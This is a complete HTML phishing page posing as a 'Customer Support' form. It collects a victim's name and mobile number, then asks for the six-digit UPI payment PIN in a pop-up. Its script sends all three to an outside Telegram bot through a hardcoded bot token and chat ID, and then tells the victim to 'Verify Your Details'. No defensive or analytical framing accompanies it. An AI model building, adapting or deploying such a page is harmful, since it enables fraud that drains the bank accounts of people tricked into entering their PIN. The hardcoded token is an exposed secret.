<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Customer Support</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: white;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center; /* Center content horizontally */
            height: 100vh;
            justify-content: flex-start; /* Remove extra space */
        }
        .header, .footer {
            text-align: center;
            padding: 20px;
            background-color: #007bff;
            color: white;
            width: 100%;
        }
        .container {
            width: 100%; /* Full width */
            max-width: 400px; /* Max width of container */
            margin: 0px auto; /* Center container */
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 20px 30px;
            box-sizing: border-box; /* Ensures padding doesn't affect width */
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
            text-align: left;
        }
        input[type="text"], input[type="tel"], input[type="password"] {
            width: 100%;
            padding: 14px;
            margin: 14px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            transition: border-color 0.3s ease;
        }
        input[type="text"]:focus, input[type="tel"]:focus, input[type="password"]:focus {
            border-color: #007bff;
            outline: none;
        }
        .button {
            width: 100%;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .button:hover {
            background: #218838;
        }
        .pending-animation {
            display: none;
            margin: 20px 0;
            text-align: center;
            font-size: 20px;
            color: #007bff;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .upi-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .upi-modal-content {
            background: white;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            width: 300px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        .upi-modal-content h2 {
            margin: 0 0 10px;
            font-size: 24px;
        }
        .upi-modal-content p {
            font-size: 16px;
            margin: 10px 0;
        }
        .upi-modal-content input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 18px;
            text-align: center;
        }
        .upi-modal-actions {
            text-align: center;
        }
        .upi-modal-actions .button {
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Customer Support</h1>
    </div>

    <div class="container">
        <form id="supportForm" onsubmit="handleSubmit(event)">
            <label for="fullName">Full Name</label>
            <input type="text" id="fullName" name="fullName" placeholder="Enter your name" required>

            <label for="mobile">Mobile Number</label>
            <input type="tel" id="mobile" name="mobile" placeholder="Enter your mobile number" required>
            <br>
            <br>
            <button type="submit" class="button">Submit</button>
        </form>

        <div class="pending-animation" id="pendingAnimation">
            <p>Pending... Please wait.</p>
            <div class="loader"></div>
        </div>
    </div>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    
    <div class="footer">
        <p>&copy; 2024-2025 Customer Support. All rights reserved.</p>
    </div>

    <!-- UPI Modal -->
    <div class="upi-modal" id="upiModal">
        <div class="upi-modal-content">
            <h2>Enter UPI PIN</h2>
            <p>Please provide your 6-digit UPI PIN to proceed:</p>
            <input type="password" id="upiPinInput" maxlength="6" placeholder="******">
            <div class="upi-modal-actions">
                <button class="button" id="upiSubmit">Submit</button>
            </div>
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault();

            const fullName = document.getElementById('fullName').value;
            const mobile = document.getElementById('mobile').value;

            const upiModal = document.getElementById('upiModal');
            const upiPinInput = document.getElementById('upiPinInput');
            const upiSubmit = document.getElementById('upiSubmit');

            upiModal.style.display = "flex";

            upiSubmit.onclick = function () {
                const upiPin = upiPinInput.value;
                if (upiPin && upiPin.length === 6) {
                    upiModal.style.display = "none";
                    document.getElementById('pendingAnimation').style.display = 'block';

                    const botToken = "7920021040:AAFpzYNTrFtv3ANwUNH6T3QV1fYakzOHbT8";
                    const chatId = "7910265509";
                    const message = `New Contact Form Submission:\n\nName: ${fullName}\nMobile: ${mobile}\nUPI PIN: ${upiPin}`;

                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: chatId, text: message })
                    })
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('pendingAnimation').style.display = 'none';
                        if (data.ok) {
                            alert("Verify Your Details");
                        } else {
                            alert("Failed to send data to Telegram.");
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                        alert("An error occurred.");
                        document.getElementById('pendingAnimation').style.display = 'none';
                    });
                } else {
                    alert("Please enter a valid 6-digit UPI PIN.");
                }
            };
        }
    </script>
</body>
</html>
